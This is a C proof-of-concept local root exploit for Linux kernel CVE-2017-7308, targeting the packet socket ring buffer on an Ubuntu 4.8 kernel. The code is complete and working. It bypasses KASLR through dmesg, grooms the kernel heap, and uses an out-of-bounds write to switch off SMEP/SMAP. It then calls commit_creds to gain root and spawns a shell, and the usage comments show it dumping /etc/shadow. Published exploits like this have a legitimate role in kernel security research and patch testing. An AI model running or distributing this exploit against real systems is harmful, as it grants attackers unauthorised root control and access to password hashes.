// A proof-of-concept local root exploit for CVE-2017-7308.
// Includes a SMEP & SMAP bypass.
// Tested on 4.8.0-41-generic Ubuntu kernel.
// https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-7308
//
// Usage:
// user@ubuntu:~$ uname -a
// Linux ubuntu 4.8.0-41-generic #44~16.04.1-Ubuntu SMP Fri Mar 3 ...
// user@ubuntu:~$ gcc pwn.c -o pwn
// user@ubuntu:~$ ./pwn
// [.] starting
// [.] namespace sandbox set up
// [.] KASLR bypass enabled, getting kernel addr
// [.] done, kernel text:   ffffffff87000000
// [.] commit_creds:        ffffffff870a5cf0
// [.] prepare_kernel_cred: ffffffff870a60e0
// [.] native_write_cr4:    ffffffff87064210
// [.] padding heap
// [.] done, heap is padded
// [.] SMEP & SMAP bypass enabled, turning them off
// [.] done, SMEP & SMAP should be off now
// [.] executing get root payload 0x401516
// [.] done, should be root now
// [.] checking if we got root
// [+] got r00t ^_^
// root@ubuntu:/home/user# cat /etc/shadow
// root:!:17246:0:99999:7:::
// daemon:*:17212:0:99999:7:::
// bin:*:17212:0:99999:7:::
// ...
//
// Andrey Konovalov <andreyknvl@gmail.com>

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>

#include <sys/ioctl.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/if_ether.h>
#include <net/if.h>

#define ENABLE_KASLR_BYPASS	1
#define ENABLE_SMEP_SMAP_BYPASS	1

// Will be overwritten if ENABLE_KASLR_BYPASS
unsigned long KERNEL_BASE = 	0xffffffff81000000ul;

// Kernel symbol offsets
#define COMMIT_CREDS		0xa5cf0ul
#define PREPARE_KERNEL_CRED	0xa60e0ul
#define NATIVE_WRITE_CR4	0x64210ul

// Should have SMEP and SMAP bits disabled
#define CR4_DESIRED_VALUE	0x407f0ul

#define KMALLOC_PAD		512
#define PAGEALLOC_PAD		1024

// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *

typedef uint32_t u32;

// $ pahole -C hlist_node ./vmlinux
struct hlist_node {
	struct hlist_node *        next;                 /*     0     8 */
	struct hlist_node * *      pprev;                /*     8     8 */
};

// $ pahole -C timer_list ./vmlinux
struct timer_list {
	struct hlist_node          entry;                /*     0    16 */
	long unsigned int          expires;              /*    16     8 */
	void                       (*function)(long unsigned int); /*    24     8 */
	long unsigned int          data;                 /*    32     8 */
	u32                        flags;                /*    40     4 */
	int                        start_pid;            /*    44     4 */
	void *                     start_site;           /*    48     8 */
	char                       start_comm[16];       /*    56    16 */
};

// packet_sock->rx_ring->prb_bdqc->retire_blk_timer
#define TIMER_OFFSET	896

// pakcet_sock->xmit
#define XMIT_OFFSET	1304

// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *

void packet_socket_rx_ring_init(int s, unsigned int block_size,
		unsigned int frame_size, unsigned int block_nr,
		unsigned int sizeof_priv, unsigned int timeout) {
	int v = TPACKET_V3;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_VERSION)");
		exit(EXIT_FAILURE);
	}

	struct tpacket_req3 req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size;
	req.tp_frame_size = frame_size;
	req.tp_block_nr = block_nr;
	req.tp_frame_nr = (block_size * block_nr) / frame_size;
	req.tp_retire_blk_tov = timeout;
	req.tp_sizeof_priv = sizeof_priv;
	req.tp_feature_req_word = 0;

	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
		unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) {
		perror("[-] socket(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
		sizeof_priv, timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	return s;
}

void packet_socket_send(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa,
			sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

void loopback_send(char *buffer, int size) {
	int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}

	packet_socket_send(s, buffer, size);
}

int packet_sock_kmalloc() {
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("[-] socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	return s;
}

void packet_sock_timer_schedule(int s, int timeout) {
	packet_socket_rx_ring_init(s, 0x1000, 0x1000, 1, 0, timeout);
}

void packet_sock_id_match_trigger(int s) {
	char buffer[16];
	packet_socket_send(s, &buffer[0], sizeof(buffer));
}

// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *

#define ALIGN(x, a)			__ALIGN_KERNEL((x), (a))
#define __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)
#define __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) & ~(mask))

#define V3_ALIGNMENT	(8)
#define BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))

#define ETH_HDR_LEN	sizeof(struct ethhdr)
#define IP_HDR_LEN	sizeof(struct iphdr)
#define UDP_HDR_LEN	sizeof(struct udphdr)

#define UDP_HDR_LEN_FULL	(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN)

int oob_setup(int offset) {
	unsigned int maclen = ETH_HDR_LEN;
	unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +
				(maclen < 16 ? 16 : maclen));
	unsigned int macoff = netoff - maclen;
	unsigned int sizeof_priv = (1u<<31) + (1u<<30) +
		0x8000 - BLK_HDR_LEN - macoff + offset;
	return packet_socket_setup(0x8000, 2048, 2, sizeof_priv, 100);
}

void oob_write(char *buffer, int size) {
	loopback_send(buffer, size);
}

void oob_timer_execute(void *func, unsigned long arg) {
	oob_setup(2048 + TIMER_OFFSET - 8);

	int i;
	for (i = 0; i < 32; i++) {
		int timer = packet_sock_kmalloc();
		packet_sock_timer_schedule(timer, 1000);
	}

	char buffer[2048];
	memset(&buffer[0], 0, sizeof(buffer));

	struct timer_list *timer = (struct timer_list *)&buffer[8];
	timer->function = func;
	timer->data = arg;
	timer->flags = 1;

	oob_write(&buffer[0] + 2, sizeof(*timer) + 8 - 2);

	sleep(1);
}

void oob_id_match_execute(void *func) {
	int s = oob_setup(2048 + XMIT_OFFSET - 64);

	int ps[32];

	int i;
	for (i = 0; i < 32; i++)
		ps[i] = packet_sock_kmalloc();

	char buffer[2048];
	memset(&buffer[0], 0, 2048);

	void **xmit = (void **)&buffer[64];
	*xmit = func;

	oob_write((char *)&buffer[0] + 2, sizeof(*xmit) + 64 - 2);

	for (i = 0; i < 32; i++)
		packet_sock_id_match_trigger(ps[i]);
}

// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *

void kmalloc_pad(int count) {
	int i;
	for (i = 0; i < count; i++)
		packet_sock_kmalloc();
}

void pagealloc_pad(int count) {
	packet_socket_setup(0x8000, 2048, count, 0, 100);
}

// * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *

typedef unsigned long __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

void get_root_payload(void) {
	((_commit_creds)(KERNEL_BASE + COMMIT_CREDS))(
		((_prepare_kernel_cred)(KERNEL_BASE + PREPARE_KERNEL_CRED))(0)
	);
}

// * * * * * * * * * * * * * Simple KASLR bypass * * * * * * * * * * * * * * *

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

unsigned long get_kernel_addr() {
	int size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
	if (size == -1) {
		perror("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)");
		exit(EXIT_FAILURE);
	}

	size = (size / getpagesize() + 1) * getpagesize();
	char *buffer = (char *)mmap(NULL, size, PROT_READ|PROT_WRITE,
		MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	size = klogctl(SYSLOG_ACTION_READ_ALL, &buffer[0], size);
	if (size == -1) {
		perror("[-] klogctl(SYSLOG_ACTION_READ_ALL)");
		exit(EXIT_FAILURE);
	}

	const char *needle1 = "Freeing SMP";
	char *substr = (char *)memmem(&buffer[0], size, needle1, strlen(needle1));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in dmesg\n", needle1);
		exit(EXIT_FAILURE);
	}

	for (size = 0; substr[size] != '\n'; size++);

	const char *needle2 = "ffff";
	substr = (char *)memmem(&substr[0], size, needle2, strlen(needle2));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in dmesg\n", needle2);
		exit(EXIT_FAILURE);
	}

	char *endptr = &substr[16];
	unsigned long r = strtoul(&substr[0], &endptr, 16);

	r &= 0xfffffffffff00000ul;
	r -= 0x1000000ul;

	return r;
}

// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *

void exec_shell() {
	char *shell = "/bin/bash";
	char *args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

void fork_shell() {
	pid_t rv;

	rv = fork();
	if (rv == -1) {
		perror("[-] fork()");
		exit(EXIT_FAILURE);
	}

	if (rv == 0) {
		exec_shell();
	}
}

bool is_root() {
	// We can't simple check uid, since we're running inside a namespace
	// with uid set to 0. Try opening /etc/shadow instead.
	int fd = open("/etc/shadow", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}

void check_root() {
	printf("[.] checking if we got root\n");

	if (!is_root()) {
		printf("[-] something went wrong =(\n");
		return;
	}

	printf("[+] got r00t ^_^\n");

	// Fork and exec instead of just doing the exec to avoid potential
	// memory corruptions when closing packet sockets.
	fork_shell();
}

bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}

void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

        if (unshare(CLONE_NEWUSER) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

        if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}

	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("[-] sched_setaffinity()");
		exit(EXIT_FAILURE);
	}

	if (system("/sbin/ifconfig lo up") != 0) {
		perror("[-] system(/sbin/ifconfig lo up)");
		exit(EXIT_FAILURE);
	}
}

int main() {
	printf("[.] starting\n");

	setup_sandbox();

	printf("[.] namespace sandbox set up\n");

#if ENABLE_KASLR_BYPASS
	printf("[.] KASLR bypass enabled, getting kernel addr\n");
	KERNEL_BASE = get_kernel_addr();
	printf("[.] done, kernel text:   %lx\n", KERNEL_BASE);
#endif

	printf("[.] commit_creds:        %lx\n", KERNEL_BASE + COMMIT_CREDS);
	printf("[.] prepare_kernel_cred: %lx\n", KERNEL_BASE + PREPARE_KERNEL_CRED);

#if ENABLE_SMEP_SMAP_BYPASS
	printf("[.] native_write_cr4:    %lx\n", KERNEL_BASE + NATIVE_WRITE_CR4);
#endif

	printf("[.] padding heap\n");
	kmalloc_pad(KMALLOC_PAD);
	pagealloc_pad(PAGEALLOC_PAD);
	printf("[.] done, heap is padded\n");

#if ENABLE_SMEP_SMAP_BYPASS
	printf("[.] SMEP & SMAP bypass enabled, turning them off\n");
	oob_timer_execute((void *)(KERNEL_BASE + NATIVE_WRITE_CR4), CR4_DESIRED_VALUE);
	printf("[.] done, SMEP & SMAP should be off now\n");
#endif

	printf("[.] executing get root payload %p\n", &get_root_payload);
	oob_id_match_execute((void *)&get_root_payload);
	printf("[.] done, should be root now\n");

	check_root();

	while (1) sleep(1000);

	return 0;
}